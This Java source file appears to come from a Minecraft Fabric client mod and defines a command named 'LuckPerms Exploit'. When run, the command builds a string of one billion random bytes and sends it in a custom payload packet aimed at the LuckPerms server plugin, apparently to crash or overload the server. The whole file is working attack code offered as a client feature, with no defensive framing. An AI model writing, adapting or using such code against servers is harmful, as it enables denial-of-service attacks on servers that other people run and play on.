package io.github.spigotrce.paradiseclientprivate.command;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import io.github.spigotrce.paradiseclientprivate.packets.LuckPermsPayloadPacket;
import net.fabricmc.fabric.api.client.command.v2.ClientCommandManager;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;

import java.nio.charset.StandardCharsets;
import java.util.Random;

public class LuckPermsCommand extends Command {
    public LuckPermsCommand(MinecraftClient minecraftClient) {
        super("luckperms", "LuckPerms Exploit", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<FabricClientCommandSource> build() {
        return literal(getName())
                .executes(context -> {
                    // Generate a random JSON string of random characters
                    String randomJson = generateRandomJson(1000000000);
                    // Create and send the LuckPerms payload packet
                    LuckPermsPayloadPacket payloadPacket = new LuckPermsPayloadPacket(randomJson);
                    Helper.sendPacket(new CustomPayloadC2SPacket(payloadPacket));
                    Helper.printChatMessage("Massive JSON string sent to LuckPerms!");

                    return SINGLE_SUCCESS;
                });
    }

    private String generateRandomJson(int length) {
        byte[] array = new byte[length];
        new Random().nextBytes(array);
        return new String(array, StandardCharsets.UTF_8);
    }
}
